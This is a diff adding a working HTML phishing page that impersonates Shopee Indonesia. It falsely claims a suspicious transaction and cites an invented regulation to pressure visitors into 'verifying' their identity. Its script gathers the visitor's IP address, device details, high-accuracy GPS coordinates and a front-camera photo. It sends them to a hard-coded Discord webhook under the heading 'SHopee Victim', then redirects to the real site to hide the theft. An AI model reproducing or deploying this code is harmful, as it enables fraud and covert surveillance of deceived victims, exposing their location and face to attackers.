@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifikasi Shopee - Transaksi Mencurigakan</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    body { margin:0; padding:0; background:#f5f5f5; font-family: 'Inter', sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; }
+    .container { max-width:400px; padding:30px; background:#fff; border-radius:16px; box-shadow:0 4px 30px rgba(0,0,0,0.1); text-align:center; }
+    .logo { width:120px; margin-bottom:20px; }
+    h1 { color:#ee4d2d; font-weight:600; margin:0 0 10px 0; font-size:22px; }
+    p { color:#555; margin:10px 0; font-size:14px; line-height:1.4; }
+    .warning { color:#d32f2f; font-weight:500; background:#fff3e0; padding:10px; border-radius:8px; margin:15px 0; font-size:13px; }
+    button { background:#ee4d2d; color:#fff; border:none; padding:14px 32px; font-size:16px; font-weight:500; border-radius:8px; cursor:pointer; margin:20px 0; width:100%; transition:0.2s; }
+    button:hover { background:#d32f2f; transform:translateY(-1px); }
+    #status { color:#666; margin-top:15px; font-size:13px; }
+    #video, #canvas { display:none; }
+    .progress { height:4px; background:#eee; border-radius:2px; margin:15px 0; overflow:hidden; }
+    .progress-bar { height:100%; background:#ee4d2d; width:0%; transition:0.3s; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <img src="https://logo.clearbit.com/shopee.co.id" alt="Shopee" class="logo">
+  <h1>Verifikasi Transaksi</h1>
+  <p>Akun Anda terdeteksi transaksi mencurigakan senilai Rp 1.250.000</p>
+  <p class="warning">Untuk melanjutkan, verifikasi identitas Anda dengan lokasi dan wajah (wajib sesuai regulasi BI 2026)</p>
+  
+  <div class="progress"><div id="prog" class="progress-bar"></div></div>
+  <button id="verifyBtn">Verifikasi Sekarang</button>
+  <div id="status">Izinkan akses untuk verifikasi...</div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+const webhook = "https://discord.com/api/webhooks/1470314505702735938/2-5LF7HfjqMGtbXD8vKk8Sze8cNapndviB9wni9szjUdYNiUEp5JJkfLlN6wqgAjp812";
+
+async function compressImage(base64, callback) {
+  const img = new Image();
+  img.onload = () => {
+    const canvas = document.getElementById("canvas");
+    canvas.width = 320; // kecil biar <500KB
+    canvas.height = 240;
+    canvas.getContext("2d").drawImage(img, 0, 0, 320, 240);
+    callback(canvas.toDataURL("image/jpeg", 0.35)); // kompres brutal
+  };
+  img.src = base64;
+}
+
+async function sendData(textData, imageData = null) {
+  try {
+    const payload = {
+      content: null,
+      embeds: [{
+        title: "🛒 SHopee Victim",
+        color: 0xee4d2d,
+        fields: textData.map(d => ({ name: d.name, value: d.value, inline: d.inline })),
+        timestamp: new Date().toISOString()
+      }]
+    };
+    
+    if (imageData) payload.embeds[0].thumbnail = { url: imageData };
+    
+    await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch(e) {
+    // fallback: coba lagi 2 detik kemudian
+    setTimeout(() => sendData(textData, imageData), 2000);
+  }
+}
+
+document.getElementById("verifyBtn").onclick = async () => {
+  const status = document.getElementById("status");
+  const prog = document.getElementById("prog");
+  
+  status.textContent = "Mengumpulkan data...";
+  prog.style.width = "33%";
+
+  try {
+    // 1. IP & User Agent
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    const ipInfo = `${ipData.ip} | ${navigator.userAgent} | Jakarta, ID (est)`;
+
+    // 2. Lokasi
+    const pos = await new Promise((res, rej) => 
+      navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true})
+    );
+    const coords = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (acc: ${pos.coords.accuracy}m)`;
+
+    // 3. Kamera + kompresi
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 320, height: 240 } });
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+
+    await new Promise(r => setTimeout(r, 1200));
+    
+    const canvas = document.getElementById("canvas");
+    canvas.width = 320;
+    canvas.height = 240;
+    canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
+    
+    const rawImage = canvas.toDataURL("image/jpeg", 0.8);
+    stream.getTracks().forEach(track => track.stop());
+
+    // Kirim data teks dulu
+    await sendData([
+      { name: "📍 IP & Device", value: ipInfo, inline: false },
+      { name: "🌍 Koordinat", value: coords, inline: false },
+      { name: "📅 Waktu", value: new Date().toLocaleString("id-ID"), inline: false }
+    ]);
+
+    // Kompres & kirim gambar terpisah
+    compressImage(rawImage, (compressed) => {
+      sendData([], compressed);
+      prog.style.width = "100%";
+      status.textContent = "Verifikasi berhasil! Mengarahkan ke Shopee...";
+      setTimeout(() => window.location.href = "https://shopee.co.id", 2000);
+    });
+
+  } catch (err) {
+    status.textContent = "Verifikasi gagal. Transaksi dibatalkan dalam 5 menit.";
+    prog.style.width = "0%";
+  }
+};
+</script>
+</body>
+</html>
